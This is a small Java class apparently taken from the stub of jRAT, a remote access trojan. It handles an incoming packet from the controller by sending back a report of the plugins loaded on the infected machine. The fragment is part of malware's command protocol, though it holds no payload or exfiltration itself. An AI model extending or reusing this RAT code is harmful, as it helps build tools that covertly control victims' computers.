package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet16LoadedPlugins;

public class Packet89LoadedPlugins extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.addToSendQueue(new Packet16LoadedPlugins());
	}

}
